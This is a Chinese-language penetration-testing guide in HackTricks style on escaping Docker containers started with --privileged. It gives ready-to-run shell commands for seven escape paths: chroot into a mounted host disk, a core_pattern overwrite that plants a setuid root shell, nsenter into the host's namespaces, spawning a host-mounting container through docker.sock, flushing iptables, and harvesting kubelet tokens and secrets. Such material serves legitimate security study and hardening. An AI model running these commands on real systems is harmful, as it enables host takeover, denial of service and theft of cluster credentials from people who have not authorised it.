# 从 `--privileged` 容器中逃逸

{{#include ../../../banners/hacktricks-training.md}}

## 概述

使用 `--privileged` 启动的容器，并不只是比普通容器多拥有一两个权限。实际上，`--privileged` 会移除或削弱多项默认的 runtime 保护机制，而这些机制通常用于阻止 workload 接触危险的 host 资源。具体效果仍取决于 runtime 和 host，但对于 Docker，通常结果如下：

- 授予所有 capabilities
- 解除 device cgroup 限制
- 使许多 kernel filesystems 不再以只读方式挂载
- 移除默认被 masked 的 procfs 路径
- 禁用 seccomp filtering
- 禁用 AppArmor confinement
- 禁用 SELinux isolation，或替换为范围更广的 label

重要的一点是，privileged 容器通常**不**需要复杂的 kernel exploit。在许多情况下，它只需直接与 host devices、面向 host 的 kernel filesystems 或 runtime interfaces 交互，然后 pivot 到 host shell。

## `--privileged` 不会自动更改的内容

`--privileged` **不会**自动加入 host 的 PID、network、IPC 或 UTS namespaces。privileged 容器仍然可以拥有私有 namespaces。这意味着某些 escape chains 还需要额外条件，例如：

- host bind mount
- host PID sharing
- host networking
- 可见的 host devices
- 可写的 proc/sys interfaces

在真实的 misconfigurations 中，这些条件通常很容易满足，但从概念上来说，它们与 `--privileged` 本身是相互独立的。

## Escape Paths

### 1. 通过暴露的 Devices 挂载 Host Disk

privileged 容器通常可以在 `/dev` 下看到更多的 device nodes。如果 host block device 可见，最简单的 escape 方法就是挂载它，然后使用 `chroot` 进入 host filesystem：
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
如果 root 分区不明显，请先枚举块设备布局：
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
如果实际可行的路径是在可写的主机挂载点中植入 setuid helper，而不是使用 `chroot`，请记住，并非每个文件系统都会遵循 setuid 位。一个快速的主机端 capability 检查方法是：
```bash
mount | grep -v "nosuid"
```
这很有用，因为 `nosuid` filesystems 下的可写路径对于经典的“放置一个 setuid shell，稍后再执行”工作流来说，吸引力要小得多。

这里被滥用的保护机制弱点包括：

- 完全暴露 devices
- 过于宽泛的 capabilities，尤其是 `CAP_SYS_ADMIN`

相关页面：

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. 挂载或复用 Host Bind Mount 并执行 `chroot`

如果 host root filesystem 已经挂载到 container 内，或者 container 具备创建必要 mounts 的能力（因为它是 privileged），那么距离获得 host shell 往往只差一个 `chroot`：
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
如果不存在主机 root bind mount，但可以访问主机存储，请创建一个：
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
此路径滥用了：

- 弱化的 mount 限制
- 完整 capabilities
- 缺少 MAC confinement

相关页面：

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. 利用可写的 `/proc/sys` 或 `/sys`

`--privileged` 带来的一个重大后果是，procfs 和 sysfs 的保护会变得弱得多。这可能暴露面向 host 的 kernel 接口，而这些接口通常会被屏蔽或以只读方式挂载。

一个经典示例是 `core_pattern`：<sup>[[1]](#references)</sup>
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
其他高价值路径包括：
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
此路径滥用了：

- 缺失的 masked paths
- 缺失的只读 system paths

相关页面：

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. 使用完整 Capabilities 进行基于 Mount 或 Namespace 的逃逸

Privileged container 会获得通常从标准 container 中移除的 capabilities，包括 `CAP_SYS_ADMIN`、`CAP_SYS_PTRACE`、`CAP_SYS_MODULE`、`CAP_NET_ADMIN` 以及许多其他 capabilities。当存在其他暴露面时，这通常足以将本地 foothold 转变为 host escape。

一个简单示例是挂载额外的 filesystems 并使用 namespace entry：
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
如果 host PID 也被共享，该步骤会变得更短：
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
此路径滥用了：

- 默认的 privileged capability set
- 可选的 host PID sharing

相关页面：

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. 通过 Runtime Sockets 逃逸

privileged container 经常会暴露 host runtime state 或 sockets。如果可以访问 Docker、containerd 或 CRI-O socket，最简单的方法通常是使用 runtime API 启动第二个具有 host access 的 container：
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
对于 containerd：
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
此路径滥用了：

- privileged runtime exposure
- 通过 runtime 自身创建的 host bind mounts

相关页面：

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. 移除 Network Isolation 的副作用

`--privileged` 本身不会加入 host network namespace，但如果容器同时使用 `--network=host` 或其他 host-network 访问权限，完整的 network stack 就会变得可修改：
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
这不一定总能直接获得 host shell，但可能导致拒绝服务、流量拦截，或访问仅限 loopback 的管理服务。

相关页面：

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. 读取主机 Secrets 和运行时状态

即使无法立即实现干净的 shell escape，特权容器通常也拥有足够的访问权限，可以读取主机 Secrets、kubelet 状态、运行时元数据以及相邻容器的文件系统：
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
如果 `/var` 是主机挂载的，或者可以看到 runtime 目录，那么即使尚未获得主机 shell，这也足以实现横向移动或窃取 cloud/Kubernetes 凭据。

相关页面：

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## 检查

以下命令用于确认哪些特权容器逃逸类别可以立即利用。
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
这里有哪些值得关注的内容：

- 完整的 capability 集合，尤其是 `CAP_SYS_ADMIN`
- 可写的 proc/sys 暴露
- 可见的主机设备
- 缺少 seccomp 和 MAC 隔离
- runtime sockets 或主机 root bind mounts

其中任何一项都可能足以实现 post-exploitation。多项同时存在时，通常意味着只需执行一两条命令，就可能攻陷主机。

## 相关页面

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

## 参考资料

- [1] [Escaping privileged containers for fun](https://pwning.systems/posts/escaping-containers-for-fun/)

{{#include ../../../banners/hacktricks-training.md}}
